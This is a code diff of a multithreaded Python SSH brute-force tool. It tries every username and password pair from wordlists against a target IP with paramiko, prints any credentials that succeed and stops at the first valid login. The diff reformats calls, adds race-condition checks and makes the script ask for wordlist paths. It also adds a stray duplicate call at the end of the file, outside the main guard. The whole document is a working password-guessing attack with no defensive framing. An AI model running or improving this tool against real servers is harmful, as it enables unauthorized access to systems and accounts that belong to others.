@@ -4,6 +4,7 @@ import sys
 import threading
 from queue import Queue
 
+
 def ssh_attempt(host, port, username, password, timeout, result_queue, stop_event):
     if stop_event.is_set():
         return
@@ -11,36 +12,56 @@ def ssh_attempt(host, port, username, password, timeout, result_queue, stop_even
     client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
     try:
         print(f"Trying {username}:{password}")
-        client.connect(host, port=port, username=username, password=password, timeout=timeout, banner_timeout=timeout)
-        print(f"\n[+] SUCCESS: Username: {username} | Password: {password}")
-        result_queue.put((username, password))
-        stop_event.set()
+        client.connect(
+            host,
+            port=port,
+            username=username,
+            password=password,
+            timeout=timeout,
+            banner_timeout=timeout
+        )
+        if not stop_event.is_set():  # double-check race condition
+            print(f"\n[+] SUCCESS: Username: {username} | Password: {password}")
+            result_queue.put((username, password))
+            stop_event.set()
     except paramiko.AuthenticationException:
         pass
     except (socket.timeout, paramiko.SSHException):
-        print("[!] Connection timed out or blocked")
+        if not stop_event.is_set():  # don’t spam after success
+            print("[!] Connection timed out or blocked")
     finally:
         client.close()
+
 
 def ssh_brute(host, port, usernames, passwords, timeout=3, max_threads=15):
     result_queue = Queue()
     threads = []
     stop_event = threading.Event()
+
     for username in usernames:
         for password in passwords:
             if stop_event.is_set():
                 break
-            t = threading.Thread(target=ssh_attempt, args=(host, port, username.strip(), password.strip(), timeout, result_queue, stop_event))
+
+            t = threading.Thread(
+                target=ssh_attempt,
+                args=(host, port, username.strip(), password.strip(), timeout, result_queue, stop_event)
+            )
             threads.append(t)
             t.start()
-            # Limit the number of concurrent threads
+
+            # Limit concurrent threads
             while threading.active_count() > max_threads:
-                pass
+                if stop_event.is_set():
+                    break
+
         if stop_event.is_set():
             break
 
-    for t in threads:
-        t.join()
+    # Only wait for threads until we find creds
+    while any(t.is_alive() for t in threads):
+        if stop_event.is_set():
+            break
 
     if not result_queue.empty():
         username, password = result_queue.get()
@@ -50,7 +71,9 @@ def ssh_brute(host, port, usernames, passwords, timeout=3, max_threads=15):
         print("\n[-] Failed to find valid credentials.")
         return None, None
 
-def read_wordlists(file_path):
+
+
+def load_wordlist(file_path):
     try:
         with open(file_path, 'r') as file:
             return [line.strip() for line in file if line.strip()]
@@ -66,10 +89,14 @@ if __name__ == "__main__":
     target_ip = sys.argv[1]
     target_port = 22
 
-    username_files = "usernames.txt"
-    password_files = "passwords.txt"
+    # Ask user for file paths interactively
+    username_file = input("Enter path to usernames file: ").strip()
+    password_file = input("Enter path to passwords file: ").strip()
 
-    username_lists = read_wordlist(username_files)
-    password_lists = read_wordlist(password_files)
+    username_list = load_wordlist(username_file)
+    password_list = load_wordlist(password_file)
 
     ssh_brute(target_ip, target_port, username_list, password_list)
+
+
+ssh_brute(target_ip, target_port, username_list, password_list)
